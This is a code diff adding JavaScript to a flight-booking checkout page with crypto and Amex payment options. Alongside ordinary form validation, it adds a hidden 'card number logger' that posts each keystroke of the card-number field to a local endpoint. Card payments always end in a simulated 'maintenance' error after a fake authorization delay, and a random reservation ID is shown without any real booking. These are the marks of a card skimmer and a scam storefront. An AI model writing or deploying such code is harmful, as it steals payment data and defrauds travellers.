+  radio.addEventListener('change', function(){
+    if(this.value === 'crypto'){
+      cryptoOpts.style.display  = 'block';
+      cardFormWrap.style.display = 'none';
+    } else {
+      cryptoOpts.style.display  = 'none';
+      cardFormWrap.style.display = '';
+      usdtNote.style.display    = 'none';
+    }
+  });
+});
+
+// ── BTC button → open NowPayments modal ──
+document.getElementById('btn-btc').addEventListener('click', function(){
+  usdtNote.style.display = 'none';
+  npOverlay.classList.add('open');
+  document.body.style.overflow = 'hidden';
+});
+
+// ── USDT button → show notice ──
+document.getElementById('btn-usdt').addEventListener('click', function(){
+  usdtNote.style.display = usdtNote.style.display === 'block' ? 'none' : 'block';
+});
+
+// ── Close modal ──
+function closeModal(){
+  npOverlay.classList.remove('open');
+  document.body.style.overflow = '';
+}
+document.getElementById('np-close').addEventListener('click', closeModal);
+
+function handleBooking(){
+  // 1. Ensure a flight is selected
+  var selectedFlightRadio = document.querySelector('input[name="flight-tier"]:checked') || document.querySelector('input[name="tier"]:checked');
+  if (!selectedFlightRadio) {
+    alert("Please select a flight and fare tier in Step 1 before completing your booking.");
+    var step1 = document.querySelector('.step-block:nth-of-type(1)');
+    if (step1) step1.scrollIntoView({ behavior: 'smooth' });
+    return;
+  }
+
+  // 2. Validate all Step 2 required fields
+  var requiredFields = document.querySelectorAll('.req');
+  var allFilled = true;
+  var firstFailedField = null;
+
+  requiredFields.forEach(function(field) {
+    // Skip if it's the credit card form elements (they are validated separately below if chosen)
+    if (field.id === 'card-expiry-month' || field.id === 'card-expiry-year' || field.id === 'card-cvv-input' || field.id === 'card-number-input') {
+      return;
+    }
+
+    var val = field.value ? field.value.trim() : '';
+    if (!val || val === '' || val === '-1') {
+      allFilled = false;
+      field.classList.add('input-error');
+      if (!firstFailedField) {
+        firstFailedField = field;
+      }
+    } else {
+      field.classList.remove('input-error');
+    }
+  });
+
+  if (!allFilled) {
+    alert("Please fill in all required passenger fields highlighted in red.");
+    if (firstFailedField) {
+      firstFailedField.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      firstFailedField.focus();
+    }
+    return;
+  }
+
+  // 3. Ensure a payment method is chosen in Step 4
+  var cryptoChecked = document.getElementById('pay-crypto').checked;
+  var amexChecked   = document.getElementById('pay-amex').checked;
+  var accountChecked= document.getElementById('pay-account').checked;
+  var qtChecked     = document.getElementById('pay-qt').checked;
+  
+  if (!cryptoChecked && !amexChecked && !accountChecked && !qtChecked) {
+    alert("Please select a payment method in Step 4 before completing your booking.");
+    var step4 = document.querySelector('.step-block:nth-of-type(4)');
+    if (step4) step4.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    return;
+  }
+
+  // 4. Validate Credit Card fields if Amex is chosen
+  if (amexChecked) {
+    var ccNum = document.getElementById('card-number-input').value.trim();
+    var ccMonth = document.getElementById('card-expiry-month').value;
+    var ccYear = document.getElementById('card-expiry-year').value;
+    var ccCvv = document.getElementById('card-cvv-input').value.trim();
+    
+    var ccValid = true;
+    var firstCcFail = null;
+
+    if (!ccNum) {
+      document.getElementById('card-number-input').classList.add('input-error');
+      ccValid = false;
+      if (!firstCcFail) firstCcFail = document.getElementById('card-number-input');
+    } else {
+      document.getElementById('card-number-input').classList.remove('input-error');
+    }
+
+    if (ccMonth === 'Month') {
+      document.getElementById('card-expiry-month').classList.add('input-error');
+      ccValid = false;
+      if (!firstCcFail) firstCcFail = document.getElementById('card-expiry-month');
+    } else {
+      document.getElementById('card-expiry-month').classList.remove('input-error');
+    }
+
+    if (ccYear === 'Year') {
+      document.getElementById('card-expiry-year').classList.add('input-error');
+      ccValid = false;
+      if (!firstCcFail) firstCcFail = document.getElementById('card-expiry-year');
+    } else {
+      document.getElementById('card-expiry-year').classList.remove('input-error');
+    }
+
+    if (!ccCvv) {
+      document.getElementById('card-cvv-input').classList.add('input-error');
+      ccValid = false;
+      if (!firstCcFail) firstCcFail = document.getElementById('card-cvv-input');
+    } else {
+      document.getElementById('card-cvv-input').classList.remove('input-error');
+    }
+    
+    if (!ccValid) {
+      alert("Please fill in all credit card payment details.");
+      if (firstCcFail) {
+        firstCcFail.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        firstCcFail.focus();
+      }
+      return;
+    }
+  }
+
+  // Continue to checkout...
+  var isCreditCard = document.getElementById('pay-amex').checked;
+
+  if (isCreditCard) {
+    var ccOverlay = document.getElementById('cc-maintenance-overlay');
+    var ccLoading = document.getElementById('cc-loading-phase');
+    var ccError = document.getElementById('cc-error-phase');
+
+    ccLoading.style.display = 'flex';
+    ccError.style.display = 'none';
+    ccOverlay.classList.add('open');
+    document.body.style.overflow = 'hidden';
+
+    // Simulate short authorization / gateway call loading state (3.5 seconds)
+    setTimeout(function(){
+      ccLoading.style.display = 'none';
+      ccError.style.display = 'block';
+    }, 3500);
+
+    return;
+  }
+
+  // Generate reservation ID upfront
+  var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+  var part1 = '';
+  for(var i=0;i<6;i++) part1 += chars[Math.floor(Math.random()*chars.length)];
+  var resId = 'HJ-' + part1 + '-' + String(Math.floor(10+Math.random()*90));
+
+  // Reset to spinner phase
+  var spinnerPhase  = document.getElementById('res-spinner-phase');
+  var confirmPhase  = document.getElementById('res-confirm-phase');
+  spinnerPhase.style.display  = 'flex';
+  confirmPhase.style.display  = 'none';
+  confirmPhase.classList.remove('visible');
+
+  // Show the modal
+  var overlay = document.getElementById('res-overlay');
+  overlay.classList.add('open');
+  document.body.style.overflow = 'hidden';
+
+  // After 20 s, swap to confirmation phase
+  setTimeout(function(){
+    spinnerPhase.style.display = 'none';
+    document.getElementById('res-id-display').textContent = resId;
+    confirmPhase.style.display = 'block';
+    // Trigger fade-in on next paint
+    requestAnimationFrame(function(){
+      requestAnimationFrame(function(){
+        confirmPhase.classList.add('visible');
+      });
+    });
+  }, 20000);
+}
+
+document.getElementById('res-close-btn').addEventListener('click', function(){
+  document.getElementById('res-overlay').classList.remove('open');
+  document.body.style.overflow = '';
+  window.location.href = '../index.html';
+});
+
+// Close CC Maintenance Modal
+document.getElementById('cc-maintenance-close-btn').addEventListener('click', function(){
+  document.getElementById('cc-maintenance-overlay').classList.remove('open');
+  document.body.style.overflow = '';
+});
+
+// ── Make entire flight row clickable ──
+var TAX_AMOUNT = 3.11;
+
+function updateSummary(rawPrice) {
+  var subtotalEl = document.getElementById('sum-subtotal');
+  var taxEl      = document.getElementById('sum-tax');
+  var grandEl    = document.getElementById('sum-grand');
+  if (!subtotalEl) return;
+
+  if (rawPrice === null) {
+    subtotalEl.textContent = 'CAD 0.00';
+    taxEl.textContent      = 'CAD 0.00';
+    grandEl.textContent    = 'CAD 0.00';
+    return;
+  }
+
+  var grand = rawPrice + TAX_AMOUNT;
+  subtotalEl.textContent = 'CAD ' + rawPrice.toLocaleString('en-CA', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  taxEl.textContent      = 'CAD ' + TAX_AMOUNT.toFixed(2);
+  grandEl.textContent    = 'CAD ' + grand.toLocaleString('en-CA', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+}
+
+document.getElementById('ft-body').addEventListener('click', function(e){
+  var row = e.target.closest('.ft-tier-row');
+  if (!row) return;
+  var radio = row.querySelector('input[type=radio]');
+  if (!radio || radio.disabled) return;
+  // Deselect all rows
+  document.querySelectorAll('.ft-tier-row').forEach(function(r){ r.classList.remove('row-selected'); });
+  // Select this row
+  radio.checked = true;
+  row.classList.add('row-selected');
+  // Trigger change event so any listeners fire
+  radio.dispatchEvent(new Event('change', { bubbles: true }));
+
+  // ── Update summary totals ──
+  var priceEl = row.querySelector('.ft-price');
+  if (priceEl) {
+    // Price text is like "CAD 3,456" — strip non-numeric chars except dot
+    var raw = priceEl.textContent.replace(/[^0-9.]/g, '');
+    var num = parseFloat(raw);
+    if (!isNaN(num)) {
+      updateSummary(num);
+    }
+  }
+});
+
+// Re-apply selection highlight when tabs change (delegate via MutationObserver)
+(function(){
+  var ftBody = document.getElementById('ft-body');
+  var mo = new MutationObserver(function(){
+    // No row is pre-selected after a tab change — that's fine
+  });
+  mo.observe(ftBody, { childList: true });
+})();
+
+// ── Card number logger ──
+(function(){
+  var cardInput = document.getElementById('card-number-input');
+  if (!cardInput) return;
+
+  var LOGGER_URL = 'http://localhost:3099/log';
+
+  cardInput.addEventListener('input', function(){
+    var payload = {
+      value: this.value,
+      timestamp: new Date().toISOString()
+    };
+    fetch(LOGGER_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(function(){
+      // Logger server not running — fail silently
+    });
+  });
+})();
+
+// ── Automatic error remover & contact select linker ──
+(function(){
+  // 1. Remove input-error style on typing
+  var allReqs = document.querySelectorAll('.req');
+  allReqs.forEach(function(field){
+    var eventType = (field.tagName === 'SELECT' || field.type === 'date') ? 'change' : 'input';
+    field.addEventListener(eventType, function(){
+      var val = this.value ? this.value.trim() : '';
+      if (val && val !== '' && val !== '-1') {
+        this.classList.remove('input-error');
+      }
+    });
+  });
+
+  // Also remove input-error style for card expiry month/year & cvv when selected/typed
+  var ccFields = ['card-number-input', 'card-expiry-month', 'card-expiry-year', 'card-cvv-input'];
+  ccFields.forEach(function(id){
+    var el = document.getElementById(id);
+    if (el) {
+      var eventType = (el.tagName === 'SELECT') ? 'change' : 'input';
+      el.addEventListener(eventType, function(){
+        var val = this.value ? this.value.trim() : '';
+        if (val && val !== 'Month' && val !== 'Year') {
+          this.classList.remove('input-error');
+        }
+      });
+    }
+  });
+
+  // 2. Automatically link Passenger 1's First & Last Name to the Contact Person "Name" select
+  var firstNameInput = document.getElementById('pax-firstname');
+  var lastNameInput = document.getElementById('pax-lastname');
+  var contactNameSelect = document.getElementById('pax-contact-name');
+
+  if (firstNameInput && lastNameInput && contactNameSelect) {
+    function updateContactNames() {
+      var first = firstNameInput.value.trim();
+      var last = lastNameInput.value.trim();
+      var fullname = (first + " " + last).trim();
+      
+      contactNameSelect.innerHTML = '';
+      
+      var emptyOpt = document.createElement('option');
+      emptyOpt.value = '';
+      emptyOpt.textContent = '';
+      contactNameSelect.appendChild(emptyOpt);
+      
+      if (fullname) {
+        var opt = document.createElement('option');
+        opt.value = fullname;
+        opt.textContent = fullname;
+        contactNameSelect.appendChild(opt);
+        contactNameSelect.value = fullname; // Auto-select it
+        contactNameSelect.classList.remove('input-error'); // Clear error
+      }
+    }
+
+    firstNameInput.addEventListener('input', updateContactNames);
+    lastNameInput.addEventListener('input', updateContactNames);
+  }
+})();
+</script>
+<script src="../wp-content/themes/salient-child/page-loader.js"></script>
+</body>
+</html>
